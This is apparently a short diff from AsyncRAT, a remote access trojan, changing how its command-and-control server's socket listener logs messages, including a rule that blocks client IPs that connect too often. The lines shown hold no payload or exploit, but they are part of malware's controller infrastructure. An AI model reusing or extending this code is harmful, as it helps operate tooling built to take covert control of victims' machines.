@@ -26,7 +26,7 @@ namespace AsyncRAT_Sharp.Sockets
                 };
                 Server.Bind(ipEndPoint);
                 Server.Listen(30);
-                HandleLogs.Addmsg($"Listenning {port}", Color.Green);
+                new HandleLogs().Addmsg($"Listenning {port}", Color.Green);
                 Server.BeginAccept(EndAccept, null);
             }
             catch (Exception ex)
@@ -76,7 +76,7 @@ namespace AsyncRAT_Sharp.Sockets
             if (count > 4)
             {
                 Settings.Blocked.Add(socket.RemoteEndPoint.ToString().Split(':')[0]);
-                HandleLogs.Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} tried to spam, IP blocked", Color.Red);
+                new HandleLogs().Addmsg($"Client {socket.RemoteEndPoint.ToString().Split(':')[0]} tried to spam, IP blocked", Color.Red);
                 foreach (Clients client in Settings.Online.ToList())
                 {
                     if (client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0] == socket.RemoteEndPoint.ToString().Split(':')[0] && client.LV != null)
